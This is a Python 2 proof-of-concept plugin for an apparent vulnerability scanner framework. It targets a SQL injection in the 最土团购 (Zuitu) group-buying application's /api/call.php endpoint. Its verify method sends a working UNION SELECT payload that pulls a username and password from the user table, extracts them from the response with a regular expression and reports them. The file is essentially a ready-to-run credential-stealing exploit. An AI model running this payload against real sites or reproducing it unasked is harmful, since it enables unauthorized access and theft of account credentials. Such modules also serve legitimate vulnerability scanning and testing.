# coding: utf-8

import re
import urllib2
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = '' # 平台漏洞编号，留空
    name = '最土团购 /api/call.php SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-10-03'  # 漏洞公布时间
    desc = '''
     最土团购 /api/call.php SQL注入漏洞
    ''' # 漏洞描述
    ref = 'http://www.moonsec.com/post-11.html' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    product = '最土团购'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e447b5b5-7148-45dd-9722-59df619fa059'
    author = 'cscan'  # POC编写者
    create_date = '2018-3-24' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        payload = ("/api/call.php?action=query&num=11%27%29/**/union/**/select/**/1,2,3,"
                  "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8,9,10,11,12,13,"
                  "14,15,16/**/from/**/user/**/limit/**/0,1%23")
        path = self.target+payload
        self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
            target=self.target, vuln=self.vuln))
        try:
            content = urllib2.urlopen(urllib2.Request(path)).read()
            pattern = re.compile(r".*?<id>\s*~'\s*(?P<username>[^~]+)\s*~'\s*(?P<password>[\w]+)\s*</id>",re.I|re.S)
            match = pattern.match(content)
            if match != None:
                user = match.group("username")
                passwd = match.group("password")
                self.output.report(self.vuln, '目标{target}存在{name}漏洞，获取到用户名{user}密码{passwd}'.format(target=self.target,
                                                                                                   name=self.vuln.name,
                                                                                                   user=user,
                                                                                                   passwd=passwd))
        except Exception, e:
            self.output.info('执行异常{}'.format(e))
    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
